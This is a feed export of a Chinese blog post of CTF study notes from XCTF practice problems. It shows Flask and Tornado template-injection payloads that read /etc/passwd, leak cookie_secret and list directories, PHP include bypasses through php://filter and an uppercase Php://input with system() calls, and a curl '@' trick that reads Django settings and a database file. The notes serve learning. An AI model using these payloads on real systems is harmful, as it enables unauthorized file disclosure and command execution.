{
    "version": "https://jsonfeed.org/version/1",
    "title": "StarofEden🌸 • All posts by \"ctf\" tag",
    "description": "",
    "home_page_url": "https://StarofEden.github.io",
    "items": [
        {
            "id": "https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/",
            "url": "https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/",
            "title": "xctf刷题",
            "date_published": "2023-04-14T16:00:00.000Z",
            "content_html": "<h1 id=\"模板注入\"><a class=\"markdownIt-Anchor\" href=\"#模板注入\">#</a> <strong>模板注入</strong></h1>\n<h2 id=\"tornado-框架\"><a class=\"markdownIt-Anchor\" href=\"#tornado-框架\">#</a> Tornado 框架</h2>\n<h3 id=\"知识点\"><a class=\"markdownIt-Anchor\" href=\"#知识点\">#</a> 知识点：</h3>\n<ul>\n<li>render 函数：通过传递不同的参数形成不同的改变</li>\n<li>tornado render 模板注入漏洞：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br></pre></td></tr></table></figure>\n<h3 id=\"得到cookie_secret的值\"><a class=\"markdownIt-Anchor\" href=\"#得到cookie_secret的值\">#</a> 得到 cookie_secret 的值：</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><em>handler.settings 是 tornado 框架的一个附属文件</em></p>\n<h2 id=\"flassk模板注入\"><a class=\"markdownIt-Anchor\" href=\"#flassk模板注入\">#</a> flassk 模板注入</h2>\n<h3 id=\"思路\"><a class=\"markdownIt-Anchor\" href=\"#思路\">#</a> 思路：</h3>\n<p>找到父类 &lt;type ‘object’&gt;–&gt; 寻找子类–&gt; 找关于命令执行或者文件操作的模块。</p>\n<ul>\n<li>几个魔术方法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__class__  返回类型所属的对象</span><br><span class=\"line\">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class=\"line\">__base__   返回该对象所继承的基类</span><br><span class=\"line\">// __base__和__mro__都是用来寻找基类的</span><br><span class=\"line\">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class=\"line\">__init__  类的初始化方法</span><br><span class=\"line\">__globals__  对包含函数全局变量的字典的引用</span><br><span class=\"line\">## &#123;&#123;&#125;&#125;:</span><br><span class=\"line\">* 传递变量</span><br><span class=\"line\">* 执行一些简单表达式</span><br></pre></td></tr></table></figure>\n<hr>\n<ul>\n<li>\n：查看全局变量\n</li>\n</ul>\n<h3 id=\"步骤\"><a class=\"markdownIt-Anchor\" href=\"#步骤\">#</a> 步骤：</h3>\n<ol>\n<li>寻找可用引用</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>文件读取， <code>[40]</code>  是 tupe file 类型出现位置（从 0 开始的位置）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>命令执行 (有一个 &lt;class ‘site._Printer’&gt; 类型)</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>[71]</code>  为 &lt;class ‘site._Printer’&gt; 出现位置</li>\n</ul>\n<h1 id=\"2文件include\"><a class=\"markdownIt-Anchor\" href=\"#2文件include\">#</a> 2. 文件 include</h1>\n<ul>\n<li><em>5.10 更新：好久没刷题了，做个 md 复习一下</em></li>\n</ul>\n<h3 id=\"file_include过滤\"><a class=\"markdownIt-Anchor\" href=\"#file_include过滤\">#</a> file_include (过滤)</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"string\">&quot;./check.php&quot;</span>); </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;filename&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span>  = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;filename&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>尝试用 php://filter:</li>\n</ul>\n<blockquote>\n<p>?filename=php://filter/read=convert.base64-encode/reasource=check.php<br>\n 回显 &quot;do not hack!&quot;<br>\n 那应该是过滤</p>\n</blockquote>\n<ul>\n<li>使用过滤器 convert.* (string.* 被过滤)</li>\n<li>构造 URL：</li>\n</ul>\n<blockquote>\n<p>?filename=php://filter/convert.iconv.a.b/resource=flag.php<br>\n <code>flag可能在flag.php</code></p>\n</blockquote>\n<ul>\n<li>使用 bp 对 a,b 进行爆破 (集束炸弹)，字典如下：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UCS-4*</span><br><span class=\"line\">UCS-4BE</span><br><span class=\"line\">UCS-4LE*</span><br><span class=\"line\">UCS-2</span><br><span class=\"line\">UCS-2BE</span><br><span class=\"line\">UCS-2LE</span><br><span class=\"line\">UTF-32*</span><br><span class=\"line\">UTF-32BE*</span><br><span class=\"line\">UTF-32LE*</span><br><span class=\"line\">UTF-16*</span><br><span class=\"line\">UTF-16BE*</span><br><span class=\"line\">UTF-16LE*</span><br><span class=\"line\">UTF-7</span><br><span class=\"line\">UTF7-IMAP</span><br><span class=\"line\">UTF-8*</span><br><span class=\"line\">ASCII*</span><br></pre></td></tr></table></figure>\n<h2 id=\"web_php_include\"><a class=\"markdownIt-Anchor\" href=\"#web_php_include\">#</a> web_php_include</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;hello&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$page</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;page&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"title function_ invoke__\">strstr</span>(<span class=\"variable\">$page</span>, <span class=\"string\">&quot;php://&quot;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$page</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;php://&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$page</span>);<span class=\"comment\">//过滤了php://</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$page</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"知识点-2\"><a class=\"markdownIt-Anchor\" href=\"#知识点-2\">#</a> 知识点</h3>\n<ul>\n<li>由题可知过滤了 php://, 考虑使用其它伪协议</li>\n<li>伪协议包括：<br>\n<strong>file 协议</strong>：<br>\nallow_url_fopen ：off/on<br>\nallow_url_include：off/on</li>\n</ul>\n<p>file://  <code>用于访问本地文件系统</code> ，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。</p>\n<p><strong>php:// 协议</strong>:<br>\n 仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。</p>\n<p><strong>data:// 协议</strong>：满足双 off 条件</p>\n<ul>\n<li><strong>strstr</strong> 函数：<br>\n函数用于判断字符串 str2 是否是 str1 的子串。如果是，则该函数返回 str1 字符串从 str2 第一次出现的位置开始到 str1 结尾的字符串；否则，返回 NULL。</li>\n<li>**str_replace ()** 函数：</li>\n</ul>\n<blockquote>\n<p>以其他字符替换字符串中的一些字符（区分大小写）。<br>\n例如：把字符串 “Hello world!” 中的字符 “world” 替换为 “Shanghai”：</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;world&quot;</span>,<span class=\"string\">&quot;Shanghai&quot;</span>,<span class=\"string\">&quot;Hello world!&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>本题意思为当传给 page 的参数有 php：// 时替换为空</p>\n<h3 id=\"解题步骤\"><a class=\"markdownIt-Anchor\" href=\"#解题步骤\">#</a> 解题步骤</h3>\n<ol>\n<li>使用 php：//input</li>\n</ol>\n<blockquote>\n<p>构造 URL：?page=Php://input// 大写绕过<br>\n使用 bp 传入：<br>\na=<?php system('ls');?>a</p>\n</blockquote>\n<ul>\n<li>playload:</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = &lt;?php system(&#x27;cat fl4gisisish3r3.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"cat\"><a class=\"markdownIt-Anchor\" href=\"#cat\">#</a> cat</h1>\n<ul>\n<li>并不是命令注入</li>\n<li>看 wp 得知</li>\n</ul>\n<blockquote>\n<p>未过滤字符在 url 栏上会被进行 url 编码<br>\n在 url 栏测试宽字符，即 ascii 码超过 127 的 url 编码即可，也就是 %81-% ef<br>\n 发现任意一个宽字符，都会出现报错信息<br>\n<em>这道题有关一个 djiango 特性和 php 特性，没看懂。</em></p>\n</blockquote>\n<ul>\n<li>解题步骤：<br>\nplayload1：?url=%80, 发现报错，url 编码使用的是 16 进制，80 也就是 128，ASCII 码是从 0-127，所以这个时候会报错。<br>\n<strong>php 特性</strong>：<br>\nWP 得知 php 的 curl 组件请求加上 @会读取文件，读取 settings.py 文件获取数据库名称</li>\n<li>构造 playload2：<br>\n?url=@/opt/api/api/settings.py <em>读取配置文件</em><br>\n Ctrl+f 搜索 database</li>\n<li>构造 playload3：<br>\n?url=@/opt/api/database.sqlite3<br>\n <code>搜索flag/ctf可得flag</code> <br>\n <code>最后的flag竟然不包含前面的A</code></li>\n</ul>\n",
            "tags": [
                "ctf"
            ]
        }
    ]
}